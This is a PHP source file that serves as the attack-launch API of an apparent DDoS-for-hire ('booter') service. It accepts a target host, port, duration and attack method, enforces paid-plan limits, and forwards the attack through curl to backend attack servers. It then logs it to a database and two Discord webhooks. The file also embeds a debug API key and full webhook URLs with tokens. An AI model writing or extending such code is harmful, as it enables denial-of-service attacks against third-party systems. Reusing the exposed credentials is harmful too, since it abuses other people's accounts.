<?php

//ini_set('display_errors', 1);
//ini_set('display_startup_errors', 1);
//error_reporting(E_ALL);

header("Content-Type: application/json");

include_once __DIR__ . "/../../v2/php/config.php";
include_once __DIR__ . "/../../v2/php/api_access.php";

include_once __DIR__ . "/../../@/dev.php";

global $db;

if (!isset($_GET['api_key'], $_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'])) {
    http_response_code(400);
    echo json_encode([
        "error" => "invalid_request",
        "error_message" => "Invalid request !"
    ]);
    exit();
}

$apiKey = $_GET['api_key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = strtoupper($_GET['method']);

/*
// FIXME : DEBUG ONLY !!!
if ($apiKey == 0) {
    $apiKey = "9be8614f90544ae0.bf6ff863108a6b2d.a328d68adb87c3cecd5475a6db3843505f611d1d";
}
*/

// Check fields
if (empty($apiKey) || empty($host) || empty($time) || empty($port) || empty($method)) {
    http_response_code(400);
    echo json_encode([
        "error" => "invalid_request_data",
        "error_message" => "Invalid request data !"
    ]);
    exit();
}

// Check api key
if (!\APIAccess\isApiKeyValid($apiKey)) {
    http_response_code(400);
    echo json_encode([
        "error" => "invalid_api_key",
        "error_message" => "Invalid API key !"
    ]);
    exit();
}

// Check if host is blacklisted
$stmt = $db->prepare("SELECT ID FROM blacklist WHERE data = ? AND type = 'victim'");
$stmt->execute([
    $host
]);
if ($stmt->rowCount() > 0) {
    http_response_code(400);
    echo json_encode([
        "error" => "invalid_host_blacklist",
        "error_message" => "Invalid host ! (blacklisted)"
    ]);
    exit();
}

$apiKeyData = \APIAccess\getApiKeyData($apiKey);
$userId = $apiKeyData["user_id"];

// Check max boot time
$stmt = $db->prepare("SELECT plans.mbt FROM users JOIN plans ON users.membership = plans.ID WHERE users.ID = ?");
$stmt->execute([
    $userId
]);
if ($stmt->rowCount() == 0) {
    http_response_code(500);
    echo json_encode([
        "error" => "internal_server_error",
        "error_message" => "Internal server error."
    ]);
    exit();
}
$maxBootTime = $stmt->fetch(PDO::FETCH_ASSOC)["mbt"];
if ($time > $maxBootTime) {
    http_response_code(400);
    echo json_encode([
        "error" => "invalid_time_max_exceeded",
        "error_message" => "Invalid time ! (max boot time exceeded)"
    ]);
    exit();
}

// Check method
$stmt = $db->prepare("SELECT id FROM methods WHERE name = ?");
$stmt->execute([
    $method
]);
if ($stmt->rowCount() == 0) {
    http_response_code(400);
    echo json_encode([
        "error" => "invalid_method",
        "error_message" => "Invalid method !"
    ]);
    exit();
}

// Get username
$stmt = $db->prepare("SELECT username FROM users WHERE ID = ?");
$stmt->execute([
   $userId
]);
if ($stmt->rowCount() == 0) {
    http_response_code(400);
    echo json_encode([
        "error" => "invalid_api_key_unlinked",
        "error_message" => "Invalid API key ! (unlinked from user)"
    ]);
    exit();
}

$username = $stmt->fetch(PDO::FETCH_ASSOC)["username"];

// Check concurrents
$stmt = $db->prepare("SELECT plans.concurrents FROM plans LEFT JOIN users ON users.membership = plans.ID WHERE users.ID = ?");
$stmt->execute([
   $userId
]);
if ($stmt->rowCount() == 0) {
    http_response_code(500);
    echo json_encode([
        "error" => "internal_server_error",
        "error_message" => "Internal server error."
    ]);
    exit();
}

$concurrents = $stmt->fetch(PDO::FETCH_ASSOC)["concurrents"];

$stmt = $db->prepare("SELECT COUNT(*) FROM logs WHERE user = ? AND time + date > UNIX_TIMESTAMP() AND stopped = 0");
$stmt->execute([
    $username
]);
$runningAttackCount = $stmt->fetchColumn();

if ($runningAttackCount >= $concurrents) {
    http_response_code(400);
    echo json_encode([
        "error" => "no_concurrent_available",
        "error_message" => "No concurrent available, please wait..."
    ]);
    exit();
}

// Get list of apis for this method
$stmt = $db->prepare("SELECT * FROM api WHERE methods = ? ORDER BY RAND()");
$stmt->execute([
    $method
]);

$handlers = [
    "api"
];

while ($apiData = $stmt->fetch(PDO::FETCH_ASSOC)) {
    $slots = $apiData["slots"];
    $api = $apiData["api"];
    $name = $apiData["name"];

    // Check if the api has available slots
    // handler ~= method                                                       handler here is theory, but, yes...
    $methodStmt = $db->prepare("SELECT COUNT(*) FROM logs WHERE method = ? AND time + date > UNIX_TIMESTAMP() AND stopped = 0");
    $methodStmt->execute([
        $method
    ]);
    $attackCount = $methodStmt->fetchColumn();
    if ($attackCount > $slots) {
        continue;
    }

    $handlers[] = $name;

    $api = str_replace([
        "[host]",
        "[port]",
        "[time]",
        "[method]"
    ], [
        $host,
        $port,
        $time,
        $method
    ], $api);

    // Send attack to API
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $api);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_NOSIGNAL, 1);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_TIMEOUT, 3);
    curl_exec($curl);
    curl_close($curl);
}

// No api was available
if (count($handlers) == 0) {
    http_response_code(500);
    echo json_encode([
        "error" => "no_handler_available",
        "error_message" => "No handler is available to process your request, please try again later."
    ]);
    exit();
}

// Insert attack into logs

$handlersString = implode(",", $handlers);

$stmt = $db->prepare("INSERT INTO logs(user, ip, port, time, method, date, stopped, handler) VALUES(?, ?, ?, ?, ?, UNIX_TIMESTAMP(), 0, ?)");
$stmt->execute([
    $username,
    $host,
    $port,
    $time,
    $method,
    $handlersString
]);

// Dev logs

$attackLogger = new \DevTools\AttackLogger();
$attackData = new \DevTools\AttackData();

// Fuck you, no choice
$_SESSION['ID'] = $userId;

$attackData->setUser(new user());
$attackData->setId($userId);
$attackData->setUsername("API : " . $username);
$attackData->setHost($host);
$attackData->setPort($port);
$attackData->setBootTime($time);
$attackData->setMethod($method);
$attackData->setType("api_start");
$attackData->setConcurrents("1");

$attackLogger->setWebhookUrl("https://discord.com/api/webhooks/1105571504973946951/WhpycDGHH38gL7cJ5ZtPBvE7Jf8WBbTviuZ74eckGzaNpyOQATbMglpsQuptQ7B2uG_M");
$attackLogger->record($attackData);

$attackLogger->setWebhookUrl("https://discord.com/api/webhooks/1113472022933147763/MzNbodC4aYwdV0Rg03PkctQku8imbYIaZCCq0Oo8-pp0Yg1xRWcy9INONSYZ7JiNYB7G");
$attackLogger->record($attackData);

echo json_encode([
    "success" => true,
    "host" => $host,
    "port" => $port,
    "time" => $time,
    //"method" => $method,
    //"handler_count" => count($handlers),
    //"handlers" => $handlersString
]);
